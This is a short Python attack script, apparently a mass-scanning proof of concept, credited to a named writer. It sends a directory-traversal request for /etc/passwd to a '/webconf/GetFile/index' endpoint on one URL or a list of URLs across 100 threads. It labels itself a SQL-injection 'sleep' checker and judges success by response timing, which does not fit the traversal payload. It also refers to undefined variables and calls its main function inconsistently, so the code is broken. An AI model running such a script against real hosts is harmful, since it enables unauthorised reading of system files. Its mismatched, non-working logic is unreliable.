import requests,sys,argparse,json
from multiprocessing.dummy import Pool
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='sqli_sleep')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    poc(args.url,args.opt)
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target,opt):
    payload1="/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
    try:
        res1 = requests.get(url=target+payload1)
        time1 = res1.elapsed.total_seconds()
        print(time1,time2)
        if time2 - time1 >= 9 :
            print(f"[+]{target}存在延时注入漏洞")
            with open (opt,'a',encoding='utf-8') as fp:
                fp.write(target)
    except:
        pass
if __name__ == '__main__':
    main()